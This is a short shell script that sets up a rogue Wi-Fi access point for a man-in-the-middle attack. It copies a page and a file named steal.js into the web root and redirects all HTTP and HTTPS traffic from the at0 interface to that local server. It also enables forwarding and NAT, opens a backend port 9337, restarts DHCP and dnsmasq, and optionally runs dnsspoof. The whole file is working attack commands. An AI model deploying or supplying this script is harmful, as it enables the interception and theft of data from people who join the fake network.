#!/bin/sh

# Copy to web server directory
cp index.html /var/www/html/index.html
cp steal.js /var/www/html/steal.js

name="wlan0"

# Config interface and enable IPv4 forward
ifconfig at0 10.0.0.1 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set iptables
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

# Redirect all HTTP/HTTPS flow to HTTP server of this machine
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80

# Open backend port for interacting with frontend
iptables -I INPUT -p tcp --dport 9337 -j ACCEPT
iptables -I OUTPUT -p tcp --dport 9337 -j ACCEPT

iptables -t nat -A POSTROUTING -j MASQUERADE

killall dnsmasq dhcpd isc-dhcp-server
cp dhcpd.conf /etc/dhcp/dhcpd.conf
dnsmasq -C dnsmasq.conf -d

# Choose ONE of following (comment another):

# For using dnsmasq
/etc/init.d/dnsmasq start

# For using dnsspoof (MitM)
echo 'dnsspoof'
dnsspoof -i eth0